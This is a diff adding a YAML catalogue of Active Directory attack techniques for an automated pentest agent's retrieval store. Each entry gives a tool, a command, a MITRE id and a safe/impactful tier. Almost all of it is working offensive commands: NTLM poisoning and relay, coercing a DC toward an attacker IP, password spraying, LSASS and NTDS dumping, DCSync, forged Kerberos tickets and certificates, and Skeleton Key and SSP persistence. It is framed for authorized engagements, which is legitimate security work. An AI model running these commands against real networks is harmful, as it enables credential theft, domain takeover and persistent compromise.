@@ -1,0 +1,318 @@
+# Active Directory attack methodology — RAG-first.
+#
+# Ingested from the Orange Cyberdefense AD mindmap v2025.03
+# (orange-cyberdefense.github.io/ocd-mindmaps). Structured by attack phase; each
+# technique carries a tool, an example command, a MITRE ATT&CK id, and a TIER:
+#   safe      = read-only / enumeration (autonomous lane)
+#   impactful = state-changing / destructive / high-risk -> APPROVAL lane only
+# Placeholders in <angle_brackets> are filled at run time. FOR AUTHORIZED
+# ENGAGEMENTS ONLY. Embedded into rag_documents so the planner / test synthesis
+# can retrieve the right AD technique + command for the current foothold.
+ad_attacks:
+  source: "Orange Cyberdefense AD mindmap v2025.03"
+  phases:
+
+    - id: no_creds
+      name: "Creds-1: No credentials (initial foothold on-network)"
+      techniques:
+        - name: LLMNR/NBT-NS/mDNS poisoning
+          tool: responder
+          command: "responder -I <interface>"
+          tier: impactful
+          mitre: T1557.001
+          note: "Captures NetNTLM hashes from broadcast name resolution. On-path/spoofing = impactful."
+        - name: IPv6 DNS takeover (mitm6)
+          tool: mitm6
+          command: "mitm6 -d <domain>"
+          tier: impactful
+          mitre: T1557
+          note: "DHCPv6 spoof -> WPAD -> relay. Pair with ntlmrelayx."
+        - name: NTLM relay to SMB (unsigned)
+          tool: ntlmrelayx
+          command: "ntlmrelayx.py -tf targets.txt -smb2support"
+          tier: impactful
+          mitre: T1557.001
+          note: "Relay captured auth to SMB where signing is off."
+        - name: NTLM relay to LDAP(S) (add computer / RBCD / shadow creds)
+          tool: ntlmrelayx
+          command: "ntlmrelayx.py -t ldaps://<dc> --delegate-access --add-computer"
+          tier: impactful
+          mitre: T1557.001
+        - name: Coerce authentication (PetitPotam)
+          tool: petitpotam
+          command: "PetitPotam.py <attacker_ip> <dc_ip>"
+          tier: impactful
+          mitre: T1187
+          note: "Also: Coercer, PrinterBug/SpoolSample, DFSCoerce. Forces DC auth to attacker for relay."
+        - name: ZeroLogon scan (safe check)
+          tool: zerologon
+          command: "zerologon-scan '<dc_netbios_name>' '<dc_ip>'"
+          tier: safe
+          mitre: T1210
+          note: "CVE-2020-1472. The EXPLOIT (resetting the DC machine password) is UNSAFE/destructive — impactful, avoid on prod."
+        - name: Anonymous/guest LDAP & SMB enumeration
+          tool: netexec
+          command: "nxc smb <dc_ip> -u '' -p '' --shares ; ldapsearch -x -H ldap://<dc_ip> -s base"
+          tier: safe
+          mitre: T1087.002
+        - name: User enumeration (kerbrute)
+          tool: kerbrute
+          command: "kerbrute userenum -d <domain> --dc <dc_ip> <userlist>"
+          tier: safe
+          mitre: T1087.002
+        - name: Password spray (lockout-aware)
+          tool: netexec
+          command: "nxc smb <dc_ip> -u users.txt -p '<Season+Year!>' --continue-on-success"
+          tier: impactful
+          mitre: T1110.003
+          note: "Get the lockout policy FIRST. Spray one password across many users; approval + rate-bounded."
+
+    - id: valid_creds_enum
+      name: "Creds valid (user): enumeration"
+      techniques:
+        - name: BloodHound collection
+          tool: bloodhound
+          command: "nxc ldap <dc_ip> -u <user> -p <password> --bloodhound -c all --dns-server <dc_ip>"
+          tier: safe
+          mitre: T1069.002
+          note: "Or sharphound.exe -c all -d <domain>. Maps attack paths (ACLs, delegation, sessions)."
+        - name: LDAP domain enumeration (ldeep)
+          tool: ldeep
+          command: "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> all <outdir>"
+          tier: safe
+          mitre: T1087.002
+        - name: Find delegation (BloodHound / findDelegation)
+          tool: impacket
+          command: "findDelegation.py <domain>/<user>:<password>"
+          tier: safe
+          mitre: T1087.002
+        - name: SMB share enumeration
+          tool: netexec
+          command: "nxc smb <target> -u <user> -p <password> --shares --spider-plus"
+          tier: safe
+          mitre: T1135
+
+    - id: credential_access
+      name: "Credential access (roasting, dumping, cracking)"
+      techniques:
+        - name: Kerberoasting
+          tool: impacket
+          command: "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -outputfile tgs.txt"
+          tier: safe
+          mitre: T1558.003
+          note: "Requests service TGS (non-destructive). Crack offline: hashcat -m 13100."
+        - name: AS-REP roasting
+          tool: impacket
+          command: "GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt"
+          tier: safe
+          mitre: T1558.004
+          note: "Users with DONT_REQ_PREAUTH. Crack: hashcat -m 18200."
+        - name: Timeroasting
+          tool: timeroast
+          command: "timeroast.py <dc_ip> -o timeroast.txt"
+          tier: safe
+          mitre: T1558
+        - name: Dump LSASS secrets
+          tool: lsassy
+          command: "lsassy -d <domain> -u <user> -p <password> <target>"
+          tier: impactful
+          mitre: T1003.001
+          note: "Reads LSASS on a remote host you admin. Or procdump/comsvcs on-host."
+        - name: Dump SAM/LSA/DPAPI (secretsdump)
+          tool: impacket
+          command: "secretsdump.py <domain>/<user>:<password>@<target>"
+          tier: impactful
+          mitre: T1003.002
+        - name: Read LAPS password
+          tool: netexec
+          command: "nxc ldap <dc_ip> -u <user> -p <password> --laps"
+          tier: safe
+          mitre: T1552
+        - name: ReadGMSAPassword
+          tool: netexec
+          command: "nxc ldap <dc_ip> -u <user> -p <password> --gmsa"
+          tier: safe
+          mitre: T1552
+        - name: Crack captured hash (hashcat)
+          tool: hashcat
+          command: "hashcat -m 13100 -a 0 tgs.txt <rockyou.txt>"
+          tier: safe
+          mitre: T1110.002
+          note: "Modes: 1000 NTLM, 13100 TGS, 18200 AS-REP, 5600 NetNTLMv2, 2100 MSCache2."
+
+    - id: privilege_escalation
+      name: "Privilege escalation (ACL, delegation)"
+      techniques:
+        - name: ForceChangePassword (ACL abuse)
+          tool: netexec
+          command: "net rpc password <targetuser> -U <domain>/<user>%<password> -S <dc>"
+          tier: impactful
+          mitre: T1098
+          note: "From BloodHound ForceChangePassword edge. Resets another user's password = impactful."
+        - name: GenericAll / GenericWrite (targeted kerberoast / shadow creds)
+          tool: targetedKerberoast
+          command: "targetedKerberoast.py -d <domain> -u <user> -p <password>"
+          tier: impactful
+          mitre: T1222
+        - name: WriteDACL / WriteOwner -> grant rights
+          tool: impacket
+          command: "dacledit.py -action write -rights FullControl -principal <user> -target <target> <domain>/<user>:<password>"
+          tier: impactful
+          mitre: T1222.001
+        - name: Unconstrained delegation (capture TGT)
+          tool: rubeus
+          command: "Rubeus.exe monitor /interval:5 ; then coerce a DC (PetitPotam) to the host"
+          tier: impactful
+          mitre: T1558
+        - name: Constrained delegation (S4U2Proxy)
+          tool: impacket
+          command: "getST.py -spn <spn> -impersonate Administrator <domain>/<user>:<password>"
+          tier: impactful
+          mitre: T1558.003
+        - name: Resource-Based Constrained Delegation (RBCD)
+          tool: impacket
+          command: "rbcd.py -delegate-from <attacker_computer> -delegate-to <target_computer> -action write <domain>/<user>:<password>"
+          tier: impactful
+          mitre: T1558.003
+          note: "Set msDS-AllowedToActOnBehalfOfOtherIdentity, then getST -impersonate."
+
+    - id: adcs
+      name: "AD Certificate Services abuse (ESC1-15)"
+      techniques:
+        - name: Enumerate vulnerable templates
+          tool: certipy
+          command: "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout"
+          tier: safe
+          mitre: T1649
+        - name: ESC1 (enrollee-supplies-subject)
+          tool: certipy
+          command: "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template <vuln_template> -upn Administrator@<domain>"
+          tier: impactful
+          mitre: T1649
+        - name: ESC8 (NTLM relay to web enrollment)
+          tool: certipy
+          command: "certipy relay -target 'http://<ca_ip>/certsrv/certfnsh.asp' -template DomainController"
+          tier: impactful
+          mitre: T1557.001
+        - name: Pass-the-Certificate (auth with pfx)
+          tool: certipy
+          command: "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+          tier: impactful
+          mitre: T1550
+
+    - id: lateral_movement
+      name: "Lateral movement"
+      techniques:
+        - name: Pass-the-Hash
+          tool: netexec
+          command: "nxc smb <target> -u <user> -H <nt_hash> -x whoami"
+          tier: impactful
+          mitre: T1550.002
+        - name: Pass-the-Ticket
+          tool: impacket
+          command: "export KRB5CCNAME=ticket.ccache ; psexec.py -k -no-pass <domain>/<user>@<target>"
+          tier: impactful
+          mitre: T1550.003
+        - name: Overpass-the-Hash (key -> TGT)
+          tool: impacket
+          command: "getTGT.py <domain>/<user> -hashes :<nt_hash>"
+          tier: impactful
+          mitre: T1550.002
+        - name: Remote exec (psexec / wmiexec / evil-winrm)
+          tool: impacket
+          command: "wmiexec.py <domain>/<user>:<password>@<target> ; evil-winrm -i <target> -u <user> -H <hash>"
+          tier: impactful
+          mitre: T1021
+
+    - id: domain_dominance
+      name: "Domain dominance & persistence (from DA/DCSync)"
+      techniques:
+        - name: DCSync (dump krbtgt / all hashes)
+          tool: impacket
+          command: "secretsdump.py -just-dc <domain>/<user>:<password>@<dc>"
+          tier: impactful
+          mitre: T1003.006
+        - name: Dump NTDS.dit
+          tool: impacket
+          command: "secretsdump.py -just-dc-ntlm <domain>/<user>:<password>@<dc>"
+          tier: impactful
+          mitre: T1003.003
+        - name: Golden Ticket
+          tool: impacket
+          command: "ticketer.py -aesKey <krbtgt_aes256> -domain-sid <domain_sid> -domain <domain> <anyuser>"
+          tier: impactful
+          mitre: T1558.001
+        - name: Silver Ticket
+          tool: impacket
+          command: "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <spn> <anyuser>"
+          tier: impactful
+          mitre: T1558.002
+        - name: Diamond / Sapphire Ticket
+          tool: impacket
+          command: "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <id> -groups '512,513,518,519,520' <anyuser>"
+          tier: impactful
+          mitre: T1558.001
+        - name: DCShadow
+          tool: mimikatz
+          command: "mimikatz 'lsadump::dcshadow /object:<obj> /attribute:<attr> /value:<val>'"
+          tier: impactful
+          mitre: T1207
+        - name: Skeleton Key
+          tool: mimikatz
+          command: "mimikatz 'privilege::debug' 'misc::skeleton' 'exit'"
+          tier: impactful
+          mitre: T1556.001
+          note: "Master password 'mimikatz' for all accounts. Destructive/detectable — approval only."
+        - name: Custom SSP
+          tool: mimikatz
+          command: "mimikatz 'privilege::debug' 'misc::memssp' 'exit'  # creds -> C:\\Windows\\System32\\kiwissp.log"
+          tier: impactful
+          mitre: T1547.005
+        - name: DSRM persistence
+          tool: powershell
+          command: "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD"
+          tier: impactful
+          mitre: T1556
+        - name: Golden certificate (forge from CA key)
+          tool: certipy
+          command: "certipy ca -backup -ca '<ca_name>' -u <user>@<domain> -hashes <hash> ; certipy forge -ca-pfx <ca.pfx> -upn administrator@<domain>"
+          tier: impactful
+          mitre: T1649
+
+    - id: trusts
+      name: "Domain/forest trust abuse"
+      techniques:
+        - name: Child -> Parent (SID history / trust key)
+          tool: impacket
+          command: "ticketer.py -aesKey <krbtgt_aes> -domain-sid <child_sid> -domain <child> -extra-sid <parent_sid>-519 <anyuser>"
+          tier: impactful
+          mitre: T1134.005
+        - name: Enumerate trusts
+          tool: sharphound
+          command: "sharphound.exe -c trusts -d <domain>"
+          tier: safe
+          mitre: T1482
+        - name: MSSQL trusted links
+          tool: netexec
+          command: "nxc mssql <target> -u <user> -p <password> -q 'SELECT * FROM sys.servers'"
+          tier: safe
+          mitre: T1210
+
+    - id: sccm
+      name: "SCCM / ConfigMgr abuse"
+      techniques:
+        - name: Enumerate SCCM
+          tool: sharpsccm
+          command: "SharpSCCM.exe local site-info ; sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip>"
+          tier: safe
+          mitre: T1087
+        - name: Loot Network Access Account (NAA) creds
+          tool: sharpsccm
+          command: "SharpSCCM.exe get secrets -r newcomputer"
+          tier: impactful
+          mitre: T1552
+        - name: Relay to SCCM site (takeover)
+          tool: sccmhunter
+          command: "sccmhunter.py admin -u <user> -p <password> -ip <sccm_ip>"
+          tier: impactful
+          mitre: T1557.001
